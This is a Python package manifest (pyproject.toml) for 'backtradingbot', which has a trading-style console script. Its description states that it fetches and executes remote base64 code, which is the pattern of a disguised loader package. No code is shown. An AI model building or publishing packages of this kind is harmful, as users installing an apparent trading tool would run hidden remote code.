[project]
name = "backtradingbot"
version = "0.1.1"
description = "A tool that fetches and executes remote base64 code"
authors = [{ name="malcolm", email="benbates2025@gmail.com" }]
license = {text = "MIT"}
readme = "README.md"
requires-python = ">=3.8"
dependencies = [
    "requests"
]

[project.scripts]
run-inittrading = "backtradingbot.core:node_db"

[build-system]
requires = ["setuptools", "wheel"]
build-backend = "setuptools.build_meta"
